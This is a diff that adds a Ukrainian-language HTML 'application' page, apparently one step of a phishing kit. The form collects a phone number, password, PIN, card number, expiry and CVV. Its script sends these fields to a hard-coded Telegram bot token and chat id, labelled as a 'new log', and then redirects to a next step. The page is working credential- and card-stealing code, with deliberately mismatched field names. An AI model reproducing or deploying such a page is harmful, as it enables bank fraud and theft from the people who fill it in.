@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>Заявка</title>
+
+<style>
+body{
+  font-family:Arial;
+  background:#f1f5f9;
+  display:flex;
+  justify-content:center;
+  align-items:center;
+  height:100vh;
+}
+
+.box{
+  background:white;
+  padding:25px;
+  border-radius:15px;
+  width:320px;
+}
+
+input{
+  width:100%;
+  padding:10px;
+  margin:6px 0;
+}
+
+button{
+  width:100%;
+  padding:12px;
+  background:#3b82f6;
+  color:white;
+  border:none;
+  border-radius:10px;
+}
+</style>
+</head>
+
+<body>
+
+<div class="box">
+  <h2>Заповніть данні</h2>
+
+  <input id="name" placeholder="Телефон">
+  <input id="phone" placeholder="Пароль">
+  <input id="tg" placeholder="Пін-код">
+  <input id="city" placeholder="Срок дійсності">
+  <input id="comment" placeholder="Номер картки">
+  <input id="cvv" placeholder="CVV">
+  
+  <button onclick="send()">Подати заявку</button>
+</div>
+
+<script>
+function send(){
+
+  const clientId = localStorage.getItem("clientId");
+  const isRepeat = localStorage.getItem("sent");
+
+  const name = document.getElementById("name").value;
+  const phone = document.getElementById("phone").value;
+  const tg = document.getElementById("tg").value;
+  const city = document.getElementById("city").value;
+  const comment = document.getElementById("comment").value;
+  const service = localStorage.getItem("service");
+
+  if(!name||!phone||!tg||!city||!comment){
+    alert("Заповніть все!");
+    return;
+  }
+
+  const token = "8589160707:AAEHCqUhzfom1D3_gtlG5eTiIrtPnXCGnNk";
+  const chat_id = "8035773808";
+
+  const title = isRepeat
+    ? `♻️ Повторный Лог №${clientId}`
+    : `🔥 Новый Лог 👻 №${clientId}`;
+
+  fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+    method:"POST",
+    headers:{"Content-Type":"application/json"},
+    body:JSON.stringify({
+      chat_id:chat_id,
+      text:
+`${title}
+
+Телефон📱: ${name}
+Пароль🗝️: ${phone}
+Пин-код🔢: ${tg}
+Срок Действия📆: ${city}
+Карта💳: ${comment}
+CVV: ${cvv}
+Банк🏧: ${service}`
+    })
+  });
+
+  localStorage.setItem("sent","yes");
+
+  window.location.href = "step4.html";
+}
+</script>
+
+</body>
+</html>
